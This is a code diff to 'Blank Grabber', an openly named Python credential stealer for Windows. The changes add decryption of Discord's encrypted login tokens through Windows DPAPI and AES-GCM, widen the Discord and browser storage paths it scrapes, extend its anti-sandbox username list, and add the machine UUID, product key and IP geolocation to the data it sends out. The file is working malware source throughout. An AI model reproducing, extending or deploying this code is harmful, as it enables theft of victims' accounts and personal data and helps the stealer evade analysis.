@@ -20,8 +20,10 @@ import sys
 import json
 import random
 import time
-from PIL import ImageGrab, Image, ImageStat
+import pyaes
 import re
+from PIL import ImageGrab, Image, ImageStat
+from win32crypt import CryptUnprotectData
 
 def fquit(verify= False):
     if BSOD and verify:
@@ -63,7 +65,7 @@ class vmprotect:
         if subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]:
             fquit(True)
 
-        if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson"]:
+        if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson", "user"]:
             fquit(True)
 
         if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076"]:
@@ -144,13 +146,13 @@ class BlankGrabber:
         t.start()
         threads.append(t)
 
+        for t in threads:
+            t.join()
         if os.path.isfile(self.tempfolder+"/Logs.txt"):
             with open(self.tempfolder+"/Logs.txt", 'r+') as e:
                 log = e.read()
                 e.seek(0)
                 e.write("These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+log.strip())
-        for t in threads:
-            t.join()
         self.send()
         
     def is_monochrome(self, path):
@@ -248,29 +250,61 @@ class BlankGrabber:
         subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
         data = []
         paths = {
-            'Discord': self.roaming + r'/discord/Local Storage/leveldb/', #Checked
-            'Discord Canary': self.roaming + r'/discordcanary/Local Storage/leveldb/', #Checked
-            'Lightcord': self.roaming + r'/Lightcord/Local Storage/leveldb/',
-            'Discord PTB': self.roaming + r'/discordptb/Local Storage/leveldb/',
-            'Opera': self.roaming + r'/Opera Software/Opera Stable/Local Storage/leveldb/',
-            'Opera GX': self.roaming + r'/Opera Software/Opera GX Stable/Local Storage/leveldb/',
-            'Amigo': self.localappdata + r'/Amigo/User Data/Local Storage/leveldb/',
-            'Torch': self.localappdata + r'/Torch/User Data/Local Storage/leveldb/',
-            'Kometa': self.localappdata + r'/Kometa/User Data/Local Storage/leveldb/',
-            'Orbitum': self.localappdata + r'/Orbitum/User Data/Local Storage/leveldb/',
-            'CentBrowser': self.localappdata + r'/CentBrowser/User Data/Local Storage/leveldb/',
-            '7Star': self.localappdata + r'/7Star/7Star/User Data/Local Storage/leveldb/',
-            'Sputnik': self.localappdata + r'/Sputnik/Sputnik/User Data/Local Storage/leveldb/',
-            'Vivaldi': self.localappdata + r'/Vivaldi/User Data/Default/Local Storage/leveldb/',
-            'Chrome SxS': self.localappdata + r'/Google/Chrome SxS/User Data/Local Storage/leveldb/',
-            'Chrome': """I will take care of it myself""", #Checked
-            'Epic Privacy Browser': self.localappdata + r'/Epic Privacy Browser/User Data/Local Storage/leveldb/',
-            'Microsoft Edge': self.localappdata + r'/Microsoft/Edge/User Data/Defaul/Local Storage/leveldb/',
-            'Uran': self.localappdata + r'/uCozMedia/Uran/User Data/Default/Local Storage/leveldb/',
-            'Yandex': self.localappdata + r'/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/',
-            'Brave': self.localappdata + r'/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/',
-            'Iridium': self.localappdata + r'/Iridium/User Data/Default/Local Storage/leveldb/'
+            'Discord': self.roaming + r'/discord',
+            'Discord Canary': self.roaming + r'/discordcanary',
+            'Lightcord': self.roaming + r'/Lightcord',
+            'Discord PTB': self.roaming + r'/discordptb',
+            'Opera': self.roaming + r'/Opera Software/Opera Stable',
+            'Opera GX': self.roaming + r'/Opera Software/Opera GX Stable',
+            'Amigo': self.localappdata + r'/Amigo/User Data',
+            'Torch': self.localappdata + r'/Torch/User Data',
+            'Kometa': self.localappdata + r'/Kometa/User Data',
+            'Orbitum': self.localappdata + r'/Orbitum/User Data',
+            'CentBrowser': self.localappdata + r'/CentBrowser/User Data',
+            '7Star': self.localappdata + r'/7Star/7Star/User Data',
+            'Sputnik': self.localappdata + r'/Sputnik/Sputnik/User Data',
+            'Vivaldi': self.localappdata + r'/Vivaldi/User Data',
+            'Chrome SxS': self.localappdata + r'/Google/Chrome SxS/User Data',
+            'Chrome': self.chromefolder,
+            'Epic Privacy Browser': self.localappdata + r'/Epic Privacy Browser/User Data',
+            'Microsoft Edge': self.localappdata + r'/Microsoft/Edge/User Data',
+            'Uran': self.localappdata + r'/uCozMedia/Uran/User Data',
+            'Yandex': self.localappdata + r'/Yandex/YandexBrowser/User Data',
+            'Brave': self.localappdata + r'/BraveSoftware/Brave-Browser/User Data',
+            'Iridium': self.localappdata + r'/Iridium/User Data',
         }
+        def RickRollDecrypt(path):
+            def decrypt_token(encrypted_token, key):
+                try:
+                    return pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16].decode()
+                    
+                except Exception as e:
+                    self.logs(e, sys.exc_info())
+                    return None
+
+            encrypted_tokens = []
+            with open(path + "/Local State", "r", errors= "ignore") as keyfile:
+                try:
+                    key = json.load(keyfile)["os_crypt"]["encrypted_key"]
+                except Exception:
+                    return
+            for file in os.listdir(path + "/Local Storage/leveldb"):
+                if not file.endswith(".log") and not file.endswith(".ldb"):
+                    continue
+                else:
+                    for line in [x.strip() for x in open(f'{path}/Local Storage/leveldb/{file}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                            if token.endswith("\\"):
+                                token.replace("\\", "")
+                            if not token in encrypted_tokens:
+                                encrypted_tokens.append(token)
+
+            for token in encrypted_tokens:
+                token = decrypt_token(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]), base64.b64decode(key)[5:])
+                if token:
+                    if not token in self.tokens:
+                        self.tokens.append(token)
+
         def grabcord(path):
             for filename in os.listdir(path):
                 if not filename.endswith('.log') and not filename.endswith('.ldb'):
@@ -281,18 +315,24 @@ class BlankGrabber:
                             if not token in self.tokens:
                                 self.tokens.append(token)
 
-        for source, path in paths.items():
-            if not source == "Chrome":
-                if not os.path.exists(path):
-                    continue
-                else:
-                    grabcord(path)
+        token_threads = []
+
+        for path in paths.items():
+            if not os.path.exists(path[1]):
+                continue
+            elif path[0] in ("Discord", "Discord Canary", "Discord PTB"):
+                t = threading.Thread(target= lambda: RickRollDecrypt(path[1]))
+                token_threads.append(t)
+                t.start()
             else:
-                dischromepath = subprocess.run('dir leveldb /AD /s /b', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
-                for dirname in dischromepath:
-                    if not os.path.isdir(dirname):
-                        continue
-                    grabcord(dirname)
+                nextPaths = subprocess.run('dir leveldb /AD /s /b', capture_output= True, shell= True, cwd= path[1]).stdout.decode().splitlines()
+                for path in nextPaths:
+                    t = threading.Thread(target= lambda: grabcord(path))
+                    token_threads.append(t)
+                    t.start()
+
+        for i in token_threads[::-1]:
+            i.join()
                     
         for token in self.tokens:
                 token = token.strip()
@@ -343,12 +383,13 @@ class BlankGrabber:
             r = json.loads(self.http.request('GET', "http://ip-api.com/json/?fields=225545").data.decode())
             if r.get("status") != "success":
                 raise Exception('Failed')
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + "\nUUID: " + subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if r['reverse'] != '':
                 data += f"\nReverse DNS: {r['reverse']}"
-        except Exception:
+        except Exception as e:
+            self.logs(e, sys.exc_info())
             r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "") + f"\nIP: {r.get('origin')}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + "\nUUID: " + subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "") + f"\nIP: {r.get('origin')}"
         return data
 
     def zip(self):
@@ -370,7 +411,7 @@ class BlankGrabber:
     }
   ],
   "username": "Blank Grabber",
-  "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
+  "avatar_url": "https://i.imgur.com/QZ0yBxB.png"
 }
         if self.trust < 3:
             fquit(True)
